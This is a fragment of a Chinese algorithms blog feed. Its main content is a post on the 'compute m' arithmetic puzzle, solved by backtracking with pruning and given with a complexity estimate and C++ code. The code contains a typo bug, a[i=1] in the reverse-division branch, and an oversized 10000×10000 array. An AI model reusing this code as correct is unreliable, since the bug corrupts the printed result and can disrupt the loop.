class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                cin<span class="token operator">>></span>q<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        Contest c<span class="token punctuation">;</span>        start <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>c<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        end <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"n = %d,time = %dms\n\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分支限界法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算m点问题</title>
      <link href="/2020/ACM/%E7%AE%97m%E7%82%B9%E9%97%AE%E9%A2%98/"/>
      <url>/2020/ACM/%E7%AE%97m%E7%82%B9%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>算m点问题。给定k个正数，用算术运算符+、-、*、/进行连接，使得最后的结果恰为m。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题需要使用回溯法，对所有可能的顺序进行深度优先遍历，直到找到结果为m的路径，进行输出。<br>由于本题的意思是可以加上括号的那种，因此两个相邻的数之间一共有6种情况。<br>以a，b分别代表两个数，可以表示为<br><code>a+b,a-b,b-a,a*b,a/b,b/a</code><br>因此，将前两个数运算得到的结果value，与选择的下一个数进行上述六种之一的运算，就可以实现加括号的效果。</p><p>由于节点数过多，还需要剪枝算法，把肯定不可能的情况舍弃，不进行扩展。<br>这题遍历并不难，关键在如何优化剪枝函数。由于在没找到结果之前，不能轻易判断该路径的正确性，因此就用下面两个情况进行剪枝。</p><p>①    因为只需要输出一个正确解，所以在找到一个输出结果之后，直接退出搜索，不再扩展其他子节点。<br>②    由于会出现重复数的情况，因此在同一层的剩余节点选数的时候，如果出现相同的值，就跳过，避免出现重复操作，浪费时间。实现方式为每一层都设一个数组记录是否使用过相同的值。</p><p>时间复杂度分析：<br>最坏情况：需要遍历所有的排列，一开始进入搜索时选择初始值有k种情况，接着有6<em>(k-1)中情况到下一层，依次类推，最终的路径总数为`6^(n-1)</em>n!<code>。因此该算法的时间复杂度为：</code>O(6^(n-1)n!)`</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">,</span>m<span class="token punctuation">,</span>flag<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag用于标记是否已经找到一组解</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//标记该数是否已经用过</span><span class="token keyword">double</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//存放k个数的顺序</span><span class="token keyword">char</span> op<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//记录运算符</span><span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//输出结果</span><span class="token punctuation">{</span>    <span class="token keyword">double</span> res <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//覆盖前一个值，便于进行循环操作</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>op<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//计算两个的值,并输出</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//如果出现负数的情况，加括号</span>            <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token operator">:</span>res <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                     cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>op<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"="</span><span class="token operator">&lt;&lt;</span>res<span class="token operator">&lt;&lt;</span><span class="token string">";"</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token operator">:</span>res <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                     cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>op<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"="</span><span class="token operator">&lt;&lt;</span>res<span class="token operator">&lt;&lt;</span><span class="token string">";"</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'_'</span><span class="token operator">:</span>res <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                     cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">'-'</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"="</span><span class="token operator">&lt;&lt;</span>res<span class="token operator">&lt;&lt;</span><span class="token string">";"</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token operator">:</span>res <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                     cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>op<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"="</span><span class="token operator">&lt;&lt;</span>res<span class="token operator">&lt;&lt;</span><span class="token string">";"</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token operator">:</span>res <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">/</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                     cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>op<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"="</span><span class="token operator">&lt;&lt;</span>res<span class="token operator">&lt;&lt;</span><span class="token string">";"</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'\\'</span><span class="token operator">:</span>res <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>a<span class="token punctuation">[</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                      cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">'/'</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">"("</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">")"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"="</span><span class="token operator">&lt;&lt;</span>res<span class="token operator">&lt;&lt;</span><span class="token string">";"</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> step<span class="token punctuation">,</span><span class="token keyword">double</span> value<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//找到解，将之后将要搜索的节点直接退出</span>    <span class="token comment" spellcheck="true">// if(!flag &amp;&amp; step == k &amp;&amp; int((value-m)*10000000)==0)//求时间复杂度时使用，同时将上下两句注释掉</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>step <span class="token operator">==</span> k <span class="token operator">&amp;&amp;</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10000000</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果找到就输出</span>    <span class="token punctuation">{</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出结果</span>        flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//找到解，置1，剪枝</span>        <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//退出</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        vis<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> step<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//从后面没有确定的数中选一个</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果将要扩展的节点已经扩展过，只是重复操作，剪枝</span>        <span class="token punctuation">{</span>            vis<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//交换</span>            op<span class="token punctuation">[</span>step<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'+'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//加</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>step<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>value<span class="token operator">+</span>a<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            op<span class="token punctuation">[</span>step<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//减</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>step<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>value<span class="token operator">-</span>a<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            op<span class="token punctuation">[</span>step<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'_'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反减</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>step<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token operator">-</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>            op<span class="token punctuation">[</span>step<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//乘</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>step<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>value<span class="token operator">*</span>a<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            op<span class="token punctuation">[</span>step<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//除</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>step<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>value<span class="token operator">/</span>a<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>value <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                op<span class="token punctuation">[</span>step<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反除</span>                <span class="token function">dfs</span><span class="token punctuation">(</span>step<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token operator">/</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>step<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//还原</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始置0</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>k<span class="token operator">&amp;&amp;</span><span class="token operator">!</span>flag<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//遍历第一个数的值</span>    <span class="token punctuation">{</span>        <span class="token function">swap</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//交换</span>        <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进入搜索</span>        <span class="token function">swap</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//还原</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No Solution!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//找不到输出"No Solution!"</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">freopen</span><span class="token punctuation">(</span><span class="token string">"input.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">freopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>k<span class="token operator">>></span>m<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        clock_t start<span class="token punctuation">,</span>end<span class="token punctuation">;</span>        start <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//开始计时</span>        <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        end <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//结束计时</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"k=%d,time=%d\n\n"</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 